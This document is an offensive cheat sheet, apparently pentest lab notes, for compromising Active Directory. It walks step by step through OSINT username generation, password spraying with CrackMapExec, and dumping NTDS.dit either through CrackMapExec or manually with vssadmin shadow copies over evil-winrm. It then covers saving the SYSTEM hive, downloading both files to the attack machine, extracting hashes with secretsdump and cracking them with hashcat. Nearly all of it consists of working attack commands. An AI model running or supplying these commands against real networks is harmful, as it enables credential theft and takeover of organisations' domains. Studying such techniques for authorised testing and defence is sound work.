# Attacking AD & NTDS (Credential Harvesting)
**Concept:** 
1. **The Start:** We guess usernames based on company conventions and spray passwords to get a foothold. 
2. **The End:** Once we are Domain Admins, we extract `NTDS.dit`. This file contains the password hashes for **every** object in the domain (Users, Computers, Service Accounts).
## 1. Dictionary Attacks & Enumeration
**Goal:** Generate a valid list of usernames to facilitate a Password Spray. 
**Context:** Companies follow strict naming conventions (e.g., `JSmith` or `Jane.Smith`). If you know the convention, you can generate the usernames.
### Username Conventions
| **Convention**              | **Pattern**  | **Example (Jane Jill Doe)** |
| --------------------------- | ------------ | --------------------------- |
| *First Initial + Last*    | `flastname`  | `jdoe`                      |
| *First + Middle I + Last* | `fmlastname` | `jjdoe`                     |
| *First Name + Last*       | `firstname`  | `janedoe`                   |
| *Dot Separator*           | `first.last` | `jane.doe`                  |
| *Reverse Dot*             | `last.first` | `doe.jane`                  |
### Tool: Username Anarchy
**Purpose:** Automated generation of name permutations based on a list of real names (found via LinkedIn/OSINT).
```shell
# Usage: ./username-anarchy -i <input_names_file>
./username-anarchy -i employees.txt > potential_users.txt

# Output example:
# ben.williamson
# bwilliamson
# williamson.b
```
### Password Spraying (CrackMapExec)
**Rule:** Low and Slow. Try 1 password against 1000 users.
```shell
# Syntax: crackmapexec smb <DC_IP> -u <user_list> -p <password_list>
# -p can be a single string ('Welcome123!') or a file
crackmapexec smb 10.129.201.57 -u potential_users.txt -p /usr/share/wordlists/fasttrack.txt
```
## 2. Capturing NTDS.dit (Domain Dominance)
**Concept:** `NTDS.dit` is the heart of Active Directory. It is a database file stored on the Domain Controller that is locked by the system. To copy it, we must use **Volume Shadow Copies** (VSS) or specialized tools to inject into `LSASS`. 
**Requirement:** Domain Admin privileges.
### Method A: Automated Dump (CrackMapExec/NetExec)
The noisy, fast method.
```shell
# Dump NTDS using valid Domain Admin credentials
# --ntds: Uses Drsuapi (DCSync) or VSS to dump hashes
crackmapexec smb 10.129.201.57 -u AdminUser -p P@ssword123 --ntds
```
### Method B: Manual Extraction (Volume Shadow Copy)
The stealthy, "Living off the Land" method. Useful if AV blocks standard dump tools.

**1. Connect to the DC**
```shell
evil-winrm -i 10.129.201.57 -u Administrator -p P@ssword123
```

**2. Check Privileges** Ensure you are in the `Administrators` or `Domain Admins` group.
```powershell
net user Administrator
```

**3. Create Shadow Copy** Use `vssadmin` to create a snapshot of the C: drive. This allows us to copy files that are currently locked by the OS.
```powershell
vssadmin CREATE SHADOW /For=C:
```
- **Output:** Note the _Shadow Copy Volume Name_ (e.g., `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`).

**4. Copy NTDS.dit** Copy the database from the snapshot to a regular folder.
```powershell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```

**5. Copy SYSTEM Hive** You also need the `SYSTEM` registry hive to decrypt the NTDS file.
```powershell
reg.exe save hklm\system C:\NTDS\system.save
```

**6. Exfiltrate** Move the files to your attack machine (using SMB, SCP, or Evil-WinRM download).
```powershell
download C:\NTDS\NTDS.dit
download C:\NTDS\system.save
```
## 3. Cracking NTDS Hashes (SecretsDump)
**Context:** Once you have the files offline, you need to extract the hashes. 
**Tool:** Impacket `secretsdump.py`.
```shell
# Extract hashes from the artifact files
impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL

# Output:
# Administrator:500:aad3b...:31d6c...:::
# Krbtgt:502:aad3b...:e72c...:::
```
## 4. Cracking with Hashcat
**Hash Type:** NTLM (Mode 1000).
```shell
# Syntax: hashcat -m 1000 <hash_file> <wordlist>
hashcat -m 1000 extracted_hashes.txt /usr/share/wordlists/rockyou.txt
```